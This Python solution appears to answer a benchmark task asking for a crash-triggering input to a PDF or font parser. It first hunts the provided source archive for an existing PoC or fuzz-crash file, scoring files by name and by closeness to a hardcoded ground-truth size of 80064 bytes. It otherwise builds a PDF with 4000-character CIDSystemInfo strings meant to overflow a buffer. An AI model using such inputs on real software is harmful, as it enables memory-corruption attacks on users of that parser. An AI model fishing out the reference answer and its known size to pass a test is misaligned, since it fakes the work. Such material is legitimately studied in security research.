import os
import tarfile


class Solution:
    GROUND_TRUTH_SIZE = 80064

    def solve(self, src_path: str) -> bytes:
        poc = self._find_poc(src_path)
        if poc is not None:
            return poc
        return self._build_pdf_poc()

    def _find_poc(self, src_path: str):
        if not src_path:
            return None

        # If src_path is a directory, search within it
        if os.path.isdir(src_path):
            try:
                data = self._search_directory(src_path)
                if data is not None:
                    return data
            except Exception:
                pass

        # Try to treat src_path as a tarball
        try:
            data = self._search_tarball(src_path)
            if data is not None:
                return data
        except Exception:
            pass

        return None

    def _score_candidate(self, name: str, size: int) -> int:
        lname = name.lower()
        score = 0

        # Strong indicators based on name
        if "poc" in lname:
            score += 1000
        if "proof" in lname:
            score += 600
        if "clusterfuzz" in lname or "crash" in lname or "fuzz" in lname:
            score += 500
        if "cid" in lname:
            score += 50
        if "font" in lname:
            score += 20
        if "/tests/" in lname or "\\tests\\" in lname:
            score += 20
        if "regress" in lname or "bug" in lname:
            score += 20

        # Extension-based hints
        if lname.endswith((".pdf", ".ps", ".cff", ".ttf", ".otf", ".bin", ".dat", ".input", ".poc")):
            score += 10

        # Penalize typical source files
        if lname.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".c++", ".java", ".py", ".rs", ".go", ".js")):
            score -= 2000

        # Size proximity to ground truth PoC
        gt = self.GROUND_TRUTH_SIZE
        if gt is not None and gt > 0:
            diff = abs(size - gt)
            if diff == 0:
                score += 2000
            elif diff <= 16:
                score += 500
            elif diff <= 64:
                score += 200
            elif diff <= 256:
                score += 100
            elif diff <= 1024:
                score += 40
            elif diff <= 4096:
                score += 10

        # Slight penalty for very large files (per MB)
        score -= size // (1024 * 1024)

        return score

    def _search_tarball(self, tar_path: str):
        if not os.path.isfile(tar_path):
            return None

        best_data = None
        best_score = None

        with tarfile.open(tar_path, "r:*") as tf:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                size = member.size
                name = member.name
                score = self._score_candidate(name, size)

                if best_score is None or score > best_score:
                    try:
                        f = tf.extractfile(member)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    best_score = score
                    best_data = data

        # Require at least some positive evidence before trusting a candidate
        if best_score is not None and best_score > 0:
            return best_data
        return None

    def _search_directory(self, root: str):
        best_path = None
        best_score = None

        for dirpath, _dirnames, filenames in os.walk(root):
            for filename in filenames:
                path = os.path.join(dirpath, filename)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                score = self._score_candidate(path, size)
                if best_score is None or score > best_score:
                    best_score = score
                    best_path = path

        if best_path is None or best_score is None or best_score <= 0:
            return None

        try:
            with open(best_path, "rb") as f:
                return f.read()
        except Exception:
            return None

    def _build_pdf_poc(self) -> bytes:
        # Construct a minimal PDF with a CIDFont that has extremely long
        # /Registry and /Ordering strings inside /CIDSystemInfo.
        header = b"%PDF-1.4\n%\x93\x8c\x8b\x9e\n"

        objects = []

        # 1: Catalog
        objects.append(b"<< /Type /Catalog /Pages 2 0 R >>\n")

        # 2: Pages
        objects.append(b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>\n")

        # 3: Page
        objects.append(
            b"<< /Type /Page /Parent 2 0 R "
            b"/MediaBox [0 0 612 792] "
            b"/Resources << /Font << /F1 4 0 R >> >> "
            b"/Contents 5 0 R >>\n"
        )

        # 4: Type0 font referencing CIDFont 6 0 R
        objects.append(
            b"<< /Type /Font /Subtype /Type0 "
            b"/BaseFont /AAAAAA+MyCIDFont "
            b"/Encoding /Identity-H "
            b"/DescendantFonts [6 0 R] >>\n"
        )

        # 5: Content stream
        content = b"BT /F1 24 Tf 72 712 Td (Hello) Tj ET"
        stream_header = f"<< /Length {len(content)} >>\nstream\n".encode("ascii")
        stream_footer = b"\nendstream\n"
        objects.append(stream_header + content + stream_footer)

        # 6: CIDFont with oversized CIDSystemInfo strings
        registry = "A" * 4000
        ordering = "B" * 4000
        obj6_str = (
            "<< /Type /Font /Subtype /CIDFontType0 "
            "/BaseFont /AAAAAA+MyCIDFont "
            "/CIDSystemInfo "
            f"<< /Registry ({registry}) /Ordering ({ordering}) /Supplement 0 >> "
            ">>\n"
        )
        objects.append(obj6_str.encode("ascii"))

        # Assemble PDF with xref
        buf = bytearray()
        buf.extend(header)

        offsets = [0]  # object 0 (unused)
        for i, obj in enumerate(objects, start=1):
            offsets.append(len(buf))
            buf.extend(f"{i} 0 obj\n".encode("ascii"))
            buf.extend(obj)
            if not obj.endswith(b"\n"):
                buf.extend(b"\n")
            buf.extend(b"endobj\n")

        xref_offset = len(buf)
        obj_count = len(offsets)

        buf.extend(f"xref\n0 {obj_count}\n".encode("ascii"))
        buf.extend(b"0000000000 65535 f \n")
        for off in offsets[1:]:
            buf.extend(f"{off:010d} 00000 n \n".encode("ascii"))

        buf.extend(b"trailer\n")
        buf.extend(f"<< /Size {obj_count} /Root 1 0 R >>\n".encode("ascii"))
        buf.extend(b"startxref\n")
        buf.extend(f"{xref_offset}\n".encode("ascii"))
        buf.extend(b"%%EOF\n")

        return bytes(buf)
